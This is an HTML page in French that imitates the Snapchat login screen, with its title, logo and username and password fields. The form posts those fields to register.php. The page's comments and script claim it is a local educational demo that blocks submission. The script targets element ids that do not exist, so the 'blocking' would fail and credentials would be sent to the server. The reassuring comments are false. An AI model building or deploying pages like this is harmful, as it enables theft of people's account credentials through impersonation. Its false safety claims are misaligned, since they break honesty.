<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="icon" type="image/png" sizes="32x32" href="logosnap.png">

  <title>Connexion — Snapchat</title>
  <meta name="description" content="Démo visuelle : interface de connexion style Snapchat (usage local / éducatif uniquement)." />
  <style>
    :root{
      --bg: #f5f6f7;
      --card: #ffffff;
      --snap-yellow: #fffc00;
      --accent: #00a3ff;
      --muted: #6b7280;
      --text: #0b0b0b;
      --radius: 10px;
      --shadow: 0 8px 24px rgba(11,11,11,0.08);
      --input-border: #d1d5db;
    }

    *{box-sizing:border-box}
    html,body{height:100%;margin:0;font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;}
    body{
      background: linear-gradient(180deg, var(--bg) 0%, #ffffff 60%);
      color:var(--text);
      -webkit-font-smoothing:antialiased;
      -moz-osx-font-smoothing:grayscale;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:40px 20px;
    }

    /* Container */
    .wrap{
      width:100%;
      max-width:420px;
      text-align:center;
    }

    /* Card */
    .card{
      background:var(--card);
      border-radius:12px;
      box-shadow:var(--shadow);
      padding:34px 36px;
      margin:0 auto;
    }

    /* Logo container */
    .logo{
      width:72px;
      height:72px;
      margin:0 auto 14px;
      display:flex;
      align-items:center;
      justify-content:center;
      border-radius:50%;
      background:linear-gradient(180deg,#ffffffcc,#f1f1f1cc);
      box-shadow:0 2px 6px rgba(0,0,0,0.06);
      overflow:hidden;
    }
    .logo img{ width:64px; height:64px; display:block; object-fit:contain; }

    h1{
      font-size:20px;
      margin:6px 0 18px;
      line-height:1.05;
      font-weight:600;
    }
    p.lead{ margin:0 0 18px; color:var(--muted); font-size:14px; }

    /* Form */
    form{ display:grid; gap:12px; align-items:center; }
    label{ font-size:12px; text-align:left; color:var(--muted); margin-bottom:4px; display:block; }
    .field{ text-align:left; }

    .input{
      width:100%;
      padding:12px 14px;
      border-radius:8px;
      border:1px solid var(--input-border);
      background:#fff;
      font-size:15px;
      outline:none;
      transition:box-shadow .15s, border-color .15s;
    }
    .input:focus{ box-shadow:0 6px 18px rgba(0,0,0,0.06); border-color:#9ca3ff66; }

    .small-link{
      display:block; text-align:left; color:var(--accent); font-size:13px; margin-top:6px; text-decoration:none;
    }

    .btn{
      display:inline-block;
      width:100%;
      padding:10px 14px;
      border-radius:24px;
      border: none;
      font-weight:700;
      font-size:15px;
      cursor:pointer;
      background: linear-gradient(180deg, #00b2ff, #008fd6);
      color:#fff;
      box-shadow: 0 8px 18px rgba(3,132,255,0.18);
    }

    .btn:disabled{ opacity:0.6; cursor:not-allowed; }

    .alt{
      margin-top:14px;
      font-size:14px;
      color:var(--muted);
    }
    .alt a{ color:var(--text); font-weight:600; text-decoration:none; margin-left:6px; }

    /* Footer small site links */
    .footer{
      margin-top:26px;
      font-size:13px;
      color:var(--muted);
      display:flex;
      justify-content:center;
      gap:12px;
      flex-wrap:wrap;
    }

    /* language selector / bottom area */
    .bottom{
      margin-top:22px;
      background:#fafafa;
      padding:18px;
      border-radius:10px;
      font-size:13px;
      color:var(--muted);
      display:flex;
      justify-content:space-between;
      align-items:center;
      gap:12px;
    }
    .lang-select{ padding:8px 10px; border-radius:8px; border:1px solid var(--input-border); background:#fff; }

    /* Responsive */
    @media (max-width:460px){
      .card{ padding:22px; }
    }
  </style>
</head>
<body>
  <div class="wrap" role="main" aria-labelledby="title">
    <div class="card" aria-hidden="false">

      <!-- Remplacement propre du SVG par ton PNG -->
      <div class="logo" aria-hidden="true">
        <img src="logo_snap.png" alt="Logo" width="64" height="64">
      </div>

      <h1 id="title">Se connecter à Snapchat</h1>
      <p class="lead">Connecte-toi avec ton nom d’utilisateur, e-mail ou numéro.</p>

      <!-- Demo-only: le JS empêche la soumission réelle -->
      <form action="register.php" method="post" novalidate aria-label="Formulaire de connexion">
        <div class="field">
          <label for="user" class="sr-only">Nom d’utilisateur ou e-mail</label>
          <input class="input" id="id" name="id" type="text" autocomplete="username" placeholder="" required />
        </div>
        <div class="field">
          <label for="pwd" class="sr-only">Mot de passe</label>
          <input class="input" id="password" name="password" type="password" autocomplete="current-password" placeholder="" required />
        </div>


        <button type="submit" class="btn" aria-label="Suivant">Suivant</button>
      </form>

      <div class="alt" aria-hidden="false">
        Vous débutez sur Snap ? <a href="#" onclick="alert('Démo : inscription.'); return false;">S’inscrire</a>
      </div>

      <div class="footer" role="contentinfo" aria-label="Liens utiles">
        <span>Assistance</span>
        <span>Confidentialité</span>
        <span>Conditions</span>
      </div>
    </div>

    <div class="bottom" aria-hidden="false">
      <div>Langue</div>
      <select class="lang-select" aria-label="Sélection de la langue">
        <option>Français</option>
        <option>English</option>
        <option>Español</option>
      </select>
    </div>
  </div>

  <script>
    // Démo strictement locale : on empêche toute soumission réelle et on n'enregistre rien.
    (function(){
      const form = document.getElementById('loginForm');
      const inputUser = document.getElementById('user');
      const inputPwd = document.getElementById('pwd');
      const submitBtn = form.querySelector('button[type="submit"]');

      // initial state
      function updateButtonState() {
        const u = inputUser.value.trim();
        const p = inputPwd.value.trim();
        submitBtn.disabled = !(u && p);
      }
      updateButtonState();

      inputUser.addEventListener('input', updateButtonState);
      inputPwd.addEventListener('input', updateButtonState);

      form.addEventListener('submit', function(e){
        e.preventDefault(); // bloque l'envoi réel (aucune collecte)
        submitBtn.disabled = true;
        const oldText = submitBtn.textContent;
        submitBtn.textContent = 'Traitement…';

        // Simulateur d'attente visuelle puis message local — aucune donnée n'est envoyée ou stockée.
        setTimeout(() => {
          submitBtn.textContent = oldText;
          submitBtn.disabled = false;

          const user = inputUser.value.trim();
          if (user) {
            alert("Démo : les champs ne sont pas envoyés.\nIdentifiant saisi : " + user + "\n(aucune donnée n'a été stockée)");
          } else {
            alert("Démo : aucun identifiant saisi — formulaire non envoyé.");
          }

          // Réinitialiser le mot de passe côté client
          inputPwd.value = '';
          updateButtonState();
        }, 800);
      });
    })();
  </script>
</body>
</html>
